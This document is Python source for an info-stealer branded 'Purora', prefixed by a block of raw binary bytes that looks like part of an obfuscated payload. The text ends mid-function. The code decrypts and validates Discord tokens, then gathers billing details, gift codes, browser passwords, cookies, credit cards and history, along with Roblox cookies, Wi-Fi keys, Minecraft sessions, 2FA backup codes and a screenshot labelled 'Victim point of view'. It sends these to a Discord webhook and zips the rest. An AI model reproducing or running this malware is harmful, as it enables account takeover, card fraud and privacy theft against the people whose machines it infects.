\xfd\x7ft<\xd9\xcd\xff\xab\xe4\xff\x8b\xe8\xfaF;_oQ\xfc\xb3\xf8\xcb\xd0[\x7f~C\xc6\xa7K\xeb\x7f\xc3\x9a\xfe?\xcb\xfeu\xea?\x88\xfa\x85\xabKO\xfe\xd0S\xf3\xff\xaa\xd5\xbfEv}\x19\xc2\xe7\xf1\x12\xf0\x0f\xf1\xab\x1fW\xff\x81\xf0\x0f\xd5GY\xf99z~\xebD\xfe\x9a\xca\x7f\xc1\xf17\xaa\x7f\xc9\r\x1d\xff\x18\xc1\x91=\x9b\xff\xef\x19\xe2\x1f\xa8\xff\x8bG\x9f\xc7D\xfd\xf4\xdc\xc8\xe7_.\xff\xb3\xf2\xc3\x86F\xfd\xb4\xed\x8f\x8dW\xceQ\xfdQ\xf5\xfa\x0f\x0bO\xf3\xf8\xd6\xa5W\x1f\xa5\x0c\x7f\xb1\xeb\x03\x90\xfd\xcb\xfa\x0f\x16\xc9\x7fN\x94\xecR\xfb\'H\xcc\xa8\xa4\xfe\xed\xa5\xe3\xbf\xa1\xc7\xffL\xe6\xf3\x97\xe0_R\xe2\xdf\xad[\xff\x16\xfd\xb8\xfc?\xb4^+\x9f\x8b\xe2\xbb\xb5\xe2\xbf\xbe\xfaUO\xff\x8do\xaa\xac\xc0\x9f_b\xd7\xafV\xc2\xbf\xd0\x9b\xaf\xc7\xd4\x9b:\xf1\x0f\x14\xdf\xe2\xfc\xed\x0b\xe5\xbf\xf4\xf3\xfc\r\xd7\x7f\xe0\xe9\x8f4.\xe9?\xf4\xc4\xf8\x07\x9b\xff\xec\xd1\xbf\x88\x9fN\t\xf9[\'\xe2\xd3V\xff\x97\x88\xc8\x8f->\xc7\xe87\xc3\xfe\xb5\xeb\x7fG\xa4\x7f\xb7B\xfe3\x93\xffr\xc7\xfa;+\xe6\xbfX\xf5\xfb\x1b\x8b\xe4\xffY\xf5e\x9c\xff\x8f\xea/P\xb7\xfem\xc2\xe5\x9f\xce\x19\xff\xf3\xa1\xee\x1f\x81\xf31\xbd\xe7Q\x92\xff\xf2\xec\xf5oN\xff\xab\xc8\xdb?\xa2~\xfd[X\xb3\xff\x90\xd3\x0f\xaa\xe8\xc7\x13\xb3\xfd\x0fX\xff\x8bU/Y\xa9\xff\x01\x8a\xbfU\xf4\xff\xd5\xc2\xbf|\xff\xec\xf8\xaf\xaf\x7f\x0eg\xff\xf2\xe7\xfbb\xf8\xb7}\xf7\x13\xf8\xff\xb2xY\xb2<\xfc\xf3\xe7\xffQ\xfe\xfb\x88\xe97\xb2\x98\xff\xcf\xc6\xfb\xdc>\xf7\xf8s\x12,/\xd5\xeb?\xaa\xe6\xbfT\xae\x7f\xb3\xe2\xbf\x9e\xfe\x98U\xf3_\xd8\xfe\x7f\x17%\xfd\x04\x1d\xfbc\xe5\xc2\xb9\xbft\xfcw\xe1\xfa\xdf\xf2\xfcqlo\xd9\xf1}d/T\xce\x7fY\x10\xff\xa2\x92\xfa\xb7\x1a\xfd_\x86N\xfd \xce\xdf\x95\xf8W\x85\xff\x11\xfc\xeaI\xf5\xbf\xa8\xfe\x8d\xed\x9f\xe3\xed\x8f\x14\xff\xd4\xf9\xcfT=\xfb\x8f\xc9\xffC\xf6\x8c\xc5\xffFL\xfch1\xfc\xe3\xfa\xff\xd1\xf9\x07%\xfd\'-\xfeG\xf7\x8f\x9d;\xf1\x05\xc3\x9f}\x88\xf2}\x9c\xfe\x9d\xa1\x97\xff-1\xff\xe5\x9c\xf7\xef2\xfa\xb7\xeb\xe8\x0f\xb3\x7f\x93\xc7\xfeE|\xc8\xd3\xff\xd4\xd5\x1f6\x1eP\xf9\xe3\x15\xe3\xbf\x95\xf1\x8f\xebGa\xe1UJ\xe8\xa3k\xa2\xbfE\xd5\xfa\xb7e\xfb\xff"\xcf}\xf3\xd4\xe3,\xcd\xff\xa7\xeb\xf7\x91\xfe(\xfa\x03\xeb~\x9b7O\xe3\x7fF}\xe8\xd5\x80\xd7\x1fd\xbf\x1b3\xfe\xd6Y\n\xff\xbbp\xfc%\x1e<e\xe3\xbf\xac\xff\xef\xb9\xeb\x7f=\xf9\x93L\xff\xb0\xfa\xf9\x7fu\xfc\x7f\xd9z\xcf\xde\x82\xa5\xb9=Zn\xfe\xcb3\xe6\xff\xd5\x88\x7f\xe0\xfc]_\xfc\xc3\xe9\x9f\xe3\x8b\x9fw\xca\xeb?|\xf9\x7ff?\xee\xa1\x9e\x1f\x8ews\xf5\x1fD?\xc1\xfa\xfco\x89\xf5o\xd4\xfd\r\xf0\xfeU\xb6\x7f+\xf2?*~\x14\xd5\xcb\x7f\xae\xdb\xff\x80\xeaok\xe6\xff\xa1\xfb\x96\xf5\xcbm\x1e\\.?\xff\xa5&\xff3\xe3\xbfD?PG\x9e\x97\\\xff\x8b\xfa\xfd\xcf\xd9\xfa_\xc6\x9e\xf9?\xcf\xff\x8bJ\xf2\xbd\x89|L\xa7_\x01\xa1?\xea\xe4?;|\xd7\xd3\xff\x94\xb3\x7f\xedz\xb0\x90\xcb\xd7\xab\xec\xff+\xee/\xb7\xdeJ\xfd\xef\x9f\x88\x7f\x88\xff1\xe7\xeb\xcd\xbf\x9aV\xe2\x7fU\xed_\xad?<\xfd\xb3k\xd6\xbfe\xfd\xb9\x16\x8f\x7f\xb0\xcf\xeb\xa0\xebWk\xf8\x9f\x7f8\xff+\xf8\xb3\xa7\xfe\xa3"\xfe\xd9\xf5e\x96\x7fhD\x9c\xc7D\xd7F.\x95\xffM+\xf6\x1f\xb7\xf8\xd5\r\xd7\x7fr\xf6T\xfc\xbb\xd6\xe7&\xf5%\xea\x9f\xe8\xf4{\xa0\xfc\x07\x14\x1e\xd0\xf9\xcf\xcf\x1f\xff@\xf1P\xd3\xffl\xe6S\xdb\xf1_\xfa\xf9=\xec\xf3?\xe2\x95sO\x7f)\xad/k>\x1fb1\xfc#\x9f_\x81\xfa\xbd\x0e\xb8\xfe\x7fd\x7f\xf4\xc5\xea\x7f\xef=\xf6\xaf\x19\x1f\xcc\xf8\xb8\x93\xbff\xd9\xbf\xdd\x17\xf1\xff9\xf2\xf7R\xfe?\xbe\xfe\x17\xd7\x9f\x87\x8b\xf8\xff\xac\xe7G\xb1\xf1\x0f\xda\x7f\x85\xf7\x0f\xdf\xdf\x97\xaa\x7f\xd3\xf1\x8f\xa5\xf1\xbf\x85\xe3\xbf\xf1\xcf[\xff[\x82\x7fu\xf3_\x0c~\xdf\xb1\x9f7\x06\xf5\xa1\x04^\xbd\xd2\x95p\xf2d\x96\x14\xff]\x12\xfe\xfd\xb8\xfe\x7fD\xfd~\xafN\xfd[\x9f\xaf\'\xae\x91\xff\xec\xeb\x7f\x95\xe5\x97p\xfe\xf6\xa7\xd4\x7f\xcc\x18<m\xfa\xe4\x19\xd9[\x8b\xf5\xffC\xf8G\xf7\x07\xb9\xe4\xfbg\x8b\xf7\x8c\xf8\x16z~\x9ee/,\xd4\xffo)\xf9/K\x88\xff\xe6\xf9\xcfbm\xab\xbc\xbd_z\x7f\x97\x96\xffB\xf7\xc7Lq}\x99]\x0f\xc6\xf5\x0b\xbf\xa4\xfb\x19\xd5\xaf\xff-\xf7\xff\xc9#\xe3\x9e\xdfc\xf5o\x7f\xde\xfe\x07\xd3\x8a\xfdO\x19\xfb\xa3f\xfe\x8b\xff\xf9\x83l~\xe7\x94\xb8o_<\xcf?\xaaZ\xff\xb1`\xff\xe7J\xf9\xcf\x8b\xf4?\xc8\x9e\xcfD\xe4{\xc34\x9c\xfe9f\xfdoi}\xfc\xf3\xe5??\xa5\xff_\xcc=\xbf\xec\xb6\xd2\xf3\xcb\x9c\xfeW\x91\xed\xef\x14\x82\x0e2y\xdc_B\xfe\xf3\x8f\xc1\xbf\xfa\xfd\x0f\xa6|\xfd[~\xbe\xfa\x89\xa3\xce\xf35\xac\xe7\xcdn\xd2\xf9\xcf\xbe\xf8\x07\x7f?P~\x98\xd9\xff\n\xebK\xc4\xffN9yy\xc6\xf8\x07\xfb|\xbf\x9b\xda\xfd\x0f&\x15\xf3\xef\xa9\xfa_\xb6??\xd1\x0f\xa5\x19,\xa1\xff3z\x1e$\xdf?\xdb\xce\x9f<\xe8GL}\xf2S\xf3\xff\xac~\x91\xc6\xf9\xfe\xce\xf6k\t\xe9\xfa#\xa7\xff\xc1\x0b\xd5\x7fx\xf3\x9f\xe9\xfc\x97Z\xf6/\xca\xb7\xb0\xf4\xb9\xe9_\xfb\t\xeb?\x98\xfa\xdag\xb7\x7f\xd9\xfcb\xb2\x9f`\xfd\xf8\x87\xd3\xbf\xdd\xaa\xf7\x9b\xe9\xdcZ\xf6\xf9Ge\xfc\xef\x99\xfa\xdf\xb3\xf8W#\xfeA\xf5CY#\x9e\'g\xf6\xff\xcb\xf2\x13k\xc5?\xc2\xa7?\xff\x83\xf7\xff\x11\xf9k\x8c\xfd\xbbP\xfd\xc7\xb2\xfa_\xc5\x86?\xa7n\xfe\xcb\xc8s\xdf\x90\xbdO\xd8\xbf9\x9e\x0e\xe7Y\xc6\xe0q\xbf\xfc\xf9t\x94\xfd[\xb5\xbfE5\xfeg\xd5\x93\x98\xfe\xc9Y\xb9\xfdk=\x0f7\xc0\xf1}\x8b\x0f\x85\x9e\xf8%\xf0\x03\xf7<\x8a\xf3\xadP\xff\xeb\xf4\x1f"\xf5\x07Y\xefL>\xff\xfc\xde\xe4\xe3\x94\xbf]\xe7\xbf\xcc9\xff_R\xf2\xfcZ\xd7>\x1f\xe5\xcfC\x0b\x89\xe7Av=\xfa\xdc\xe9\xb7\xde\xd3\xf1i\x1d\x0f\x90x\xf0E\x8d\x07\xdf\xcd\xfd\xed\x99\xbd\xd5\xf8\xfc`?\xcfF\xda\xb0\x99\x1f\xa9\x8f\xfb=dH\xa3\xe2\x0bMyP\xd2\xde\x1a\xc0zc\xb0\xe9d\x8c\x0f\xd8\x92\xbc\x92+\x17\xf0\xde\x08Fy\x80\xa3\x10\x8b\xd9\xd9\xff\xaa\xf6E`l\xa4(Ix\xbb\xbd\xde\n\xc14j\xbe\x16Fps\xe7[\xfb\xfd?\x83_\xd6\xd7\xd7\xff\x07\xb4\x1e\xaa\xad'))))

class PcInfo:
    def __init__(self):
        self.get_inf(__WEBHOOK_HERE__)

    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
        embed = Embed(title="Purora", color=10038562)
        
        computer_os = platform.platform()
        cpu = wmi.WMI().Win32_Processor()[0]
        gpu = wmi.WMI().Win32_VideoController()[0]
        ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)

        embed.add_field(
            name="System Info",
            value=f''' **PC Username:** `{username}`\n **PC Name:** `{hostname}`\n **OS:** `{computer_os}`\n\n **IP:** `{ip}`\n **MAC:** `{mac}`\n **HWID:** `{hwid}`\n\n **CPU:** `{cpu.Name}`\n **GPU:** `{gpu.Name}`\n **RAM:** `{ram}GB`''',
            inline=False)
        embed.set_footer(text="https://github.com/Purora (FOR MORE SOFTWARE)")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096")

        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096", username="Purora")


@try_extract
class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.grabTokens()
        self.upload(__WEBHOOK_HERE__)
    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(self.baseurl, headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token})
                                except Exception:
                                    pass
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def upload(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())

        for token in self.tokens:
            if token in self.tokens_sent:
                pass

            val_codes = []
            val = ""
            nitro = "none"

            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                       'Content-Type': 'application/json',
                       'Authorization': token}

            r = requests.get(self.baseurl, headers=headers).json()
            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)

            username = r['username'] + '#' + r['discriminator']
            discord_id = r['id']
            avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif" if requests.get(
                f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.png"
            phone = r['phone']
            email = r['email']

            try:
                if r['mfa_enabled']:
                    mfa = "true"
                else:
                    mfa = "none"
            except Exception:
                mfa = "none"

            try:
                if r['premium_type'] == 1:
                    nitro = 'Nitro Classic'
                elif r['premium_type'] == 2:
                    nitro = 'Nitro'
                elif r['premium_type'] == 3:
                    nitro = 'Nitro Basic'
            except BaseException:
                nitro = nitro

            if b == []:
                methods = "none"
            else:
                methods = ""
                try:
                    for method in b:
                        if method['type'] == 1:
                            methods += "CREDIT CARD"
                        elif method['type'] == 2:
                            methods += "PAYPAL ACCOUNT"
                        else:
                            methods += "FOUND UNKNOWN METHOND"
                except TypeError:
                    methods += "FOUND UNKNOWN METHOND"

            val += f' **Discord ID:** `{discord_id}` \n **Email:** `{email}`\n **Phone:** `{phone}`\n\n **2FA:** `{mfa}`\n **Nitro:** `{nitro}`\n **Billing:** `{methods}`\n\n **Token:** `{token}`\n'

            if "code" in g.text:
                codes = json.loads(g.text)
                try:
                    for code in codes:
                        val_codes.append((code['code'], code['promotion']['outbound_title']))
                except TypeError:
                    pass

            if val_codes == []:
                val += f'\n**No Gift Cards Found**\n'
            elif len(val_codes) >= 3:
                num = 0
                for c, t in val_codes:
                    num += 1
                    if num == 3:
                        break
                    val += f'\n `{t}:`\n**{c}**\n[Click to copy!]({c})\n'
            else:
                for c, t in val_codes:
                    val += f'\n `{t}:`\n**{c}**\n[Click to copy!]({c})\n'

            embed = Embed(title=username, color=10038562)
            embed.add_field(name=".                                                    Discord Info                                .", value=val + "\u200b", inline=False)
            embed.set_thumbnail(url=avatar)

            webhook.send(
                embed=embed,
                avatar_url="https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096",
                username="Purora")
            self.tokens_sent += token

        image = ImageGrab.grab(
            bbox=None,
            all_screens=True,
            include_layered_windows=False,
            xdisplay=None
        )
        image.save(tempfolder + "\\image.png")

        embed2 = Embed(title="Victim point of view", color=10038562)
        file = File(tempfolder + "\\image.png", filename="image.png")
        embed2.set_image(url="attachment://image.png")

        webhook.send(
            embed=embed2,
            file=file,
            username="Purora")
        os.close(image)


@try_extract
class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        os.makedirs(os.path.join(tempfolder, "Browser"), exist_ok=True)
        os.makedirs(os.path.join(tempfolder, "Roblox"), exist_ok=True)

        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies,
                self.history,
                self.passwords,
                self.credit_cards
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile)
                    except:
                        pass

        self.roblox_cookies()

    def get_master_key(self, path: str) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return

        loginvault = create_temp()
        copy2(path, loginvault)
        conn = sqlite3.connect(loginvault)
        cursor = conn.cursor()
        with open(os.path.join(tempfolder, "Browser", "Browser Passwords.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                url, username, password = res
                password = self.decrypt_password(password, self.masterkey)
                if url != "":
                    f.write(f"URL: {url}  Username: {username}  Password: {password}\n")
        cursor.close()
        conn.close()
        os.remove(loginvault)

    def cookies(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = create_temp()
        copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        with open(os.path.join(tempfolder, "Browser", "Browser Cookies.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
        cursor.close()
        conn.close()
        os.remove(cookievault)

    def history(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        historyvault = create_temp()
        copy2(path, historyvault)
        conn = sqlite3.connect(historyvault)
        cursor = conn.cursor()
        with open(os.path.join(tempfolder, "Browser", "Browser History.txt"), 'a', encoding="utf-8") as f:
            sites = []
            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                url, title, visit_count, last_visit_time = res
                if url and title and visit_count and last_visit_time != "":
                    sites.append((url, title, visit_count, last_visit_time))
            sites.sort(key=lambda x: x[3], reverse=True)
            for site in sites:
                f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))
        cursor.close()
        conn.close()
        os.remove(historyvault)

    def credit_cards(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Web Data'
        if not os.path.isfile(path):
            return
        cardvault = create_temp()
        copy2(path, cardvault)
        conn = sqlite3.connect(cardvault)
        cursor = conn.cursor()
        with open(os.path.join(tempfolder, "Browser", "Browser Creditcards.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                if name_on_card and card_number_encrypted != "":
                    f.write(
                        f"Name: {name_on_card}   Expiration Month: {expiration_month}   Expiration Year: {expiration_year}   Card Number: {self.decrypt_password(card_number_encrypted, self.masterkey)}\n")
        f.close()
        cursor.close()
        conn.close()
        os.remove(cardvault)

    def roblox_cookies(self):
        with open(os.path.join(tempfolder, "Roblox", "Roblox Cookies.txt"), 'w', encoding="utf-8") as f:
            f.write(f"{github}\n\n")
            with open(os.path.join(tempfolder, "Browser", "Browser Cookies.txt"), 'r', encoding="utf-8") as f2:
                for line in f2:
                    if ".ROBLOSECURITY" in line:
                        f.write(line.split(".ROBLOSECURITY")[1].strip() + "\n")
            f2.close()
        f.close()


@try_extract
class Wifi:
    def __init__(self):
        self.wifi_list = []
        self.name_pass = {}

        os.makedirs(os.path.join(tempfolder, "Wifi"), exist_ok=True)

        with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
            f.write(f"{github} | Wifi Networks & Passwords\n\n")

        data = subprocess.getoutput('netsh wlan show profiles').split('\n')
        for line in data:
            if 'All User Profile' in line:
                self.wifi_list.append(line.split(":")[-1][1:])
            else:
                with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
                    f.write(f'There is no wireless interface on the system. Ethernet using twat.')
                f.close()

        for i in self.wifi_list:
            command = subprocess.getoutput(
                f'netsh wlan show profile "{i}" key=clear')
            if "Key Content" in command:
                split_key = command.split('Key Content')
                tmp = split_key[1].split('\n')[0]
                key = tmp.split(': ')[1]
                self.name_pass[i] = key
            else:
                key = ""
                self.name_pass[i] = key

        with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
            for i, j in self.name_pass.items():
                f.write(f'Wifi Name : {i} | Password : {j}\n')
        f.close()


@try_extract
class Minecraft:
    def __init__(self):
        self.roaming = os.getenv("appdata")
        self.accounts_path = "\\.minecraft\\launcher_accounts.json"
        self.usercache_path = "\\.minecraft\\usercache.json"
        self.error_message = "No minecraft accounts or access tokens :("

        os.makedirs(os.path.join(tempfolder, "Minecraft"), exist_ok=True)
        self.session_info()
        self.user_cache()

    def session_info(self):
        with open(os.path.join(tempfolder, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
            f.write(f"{github} | Minecraft Session Info\n\n")
            if os.path.exists(self.roaming + self.accounts_path):
                with open(self.roaming + self.accounts_path, "r") as g:
                    self.session = json.load(g)
                    f.write(json.dumps(self.session, indent=4))
            else:
                f.write(self.error_message)
        f.close()

    def user_cache(self):
        with open(os.path.join(tempfolder, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
            f.write(f"{github}\n\n")
            if os.path.exists(self.roaming + self.usercache_path):
                with open(self.roaming + self.usercache_path, "r") as g:
                    self.user = json.load(g)
                    f.write(json.dumps(self.user, indent=4))
            else:
                f.write(self.error_message)
        f.close()


@try_extract
class BackupCodes:
    def __init__(self):
        self.path = os.environ["HOMEPATH"]
        self.code_path = '\\Downloads\\discord_backup_codes.txt'

        os.makedirs(os.path.join(tempfolder, "Discord"), exist_ok=True)
        self.get_codes()

    def get_codes(self):
        with open(os.path.join(tempfolder, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
            f.write(f"{github}\n\n")
            if os.path.exists(self.path + self.code_path):
                with open(self.path + self.code_path, 'r') as g:
                    for line in g.readlines():
                        if line.startswith("*"):
                            f.write(line)
            else:
                f.write("No discord backup codes found")
        f.close()


def zipup():
    global localappdata
    localappdata = os.getenv('LOCALAPPDATA')

    _zipfile = os.path.join(localappdata, f'{os.getlogin()}.zip')
    zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
    abs_src = os.path.abspath(tempfolder)
    for dirname, _, files in os.walk(tempfolder):
        for filename in files:
            absname = os.path.abspath(os.path.join(dirname, filename))
            arcname = absname[len(abs_src) + 1:]
            zipped_file.write(absname, arcname)
    zipped_file.close()

    def get_core(self, dir: str):
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
